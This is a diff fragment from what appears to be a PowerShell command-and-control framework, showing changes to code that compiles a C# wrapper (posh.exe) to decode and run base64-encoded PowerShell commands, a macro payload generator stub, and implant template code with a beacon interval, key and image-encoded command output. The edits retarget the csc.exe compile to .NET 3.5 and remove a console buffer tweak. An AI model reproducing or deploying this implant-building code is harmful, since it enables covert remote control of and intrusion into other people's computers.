@@ -279,18 +279,16 @@ public class Program
 		    }
 		    return stringBuilder.ToString().Trim();
 		}
-		public static int Main()
+		public static void Main()
 		{
 	        try
 	        {
 	            string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
 	            InvokeAutomation(tt);
-	            return 0;
 	        }
 	        catch
 	        {
 	            Console.WriteLine("Error running encoded command, ensure the command is unicode base64!");
-	            return (-1);
 	        }
 		}
 		
@@ -328,8 +326,8 @@ public class Sample : System.Configuration.Install.Installer
 }'
 [IO.File]::WriteAllLines("$global:newdir\posh.cs", $csccode)
 
-Start-Process -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\posh.exe $global:newdir\posh.cs /reference:C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll"
-
+#Start-Process -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\posh.exe $global:newdir\posh.cs /reference:C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll"
+Start-Process -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\posh.exe $global:newdir\posh.cs /reference:C:\Temp\PowershellC2\System.Management.Automation.dll"
 }
 # create macro payloads
 function CreateMacroPayload 
@@ -832,15 +830,6 @@ while ($listener.IsListening)
 $key="' + "$key"+'"
 $sleeptime = '+$defaultbeacon+'
 $payload = "' + "$payload"+'"
-try {
-$pshost = get-host
-$pswindow = $pshost.ui.rawui
-$newsize = $pswindow.buffersize
-$newsize.height = 3000
-$newsize.width = 150
-$pswindow.buffersize = $newsize
-} 
-catch { write-host "Unable to update UI" }
 
 function getimgdata($cmdoutput) {
     $icoimage = "'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'","","'+$imageArray[2]+'","'+$imageArray[3]+'"
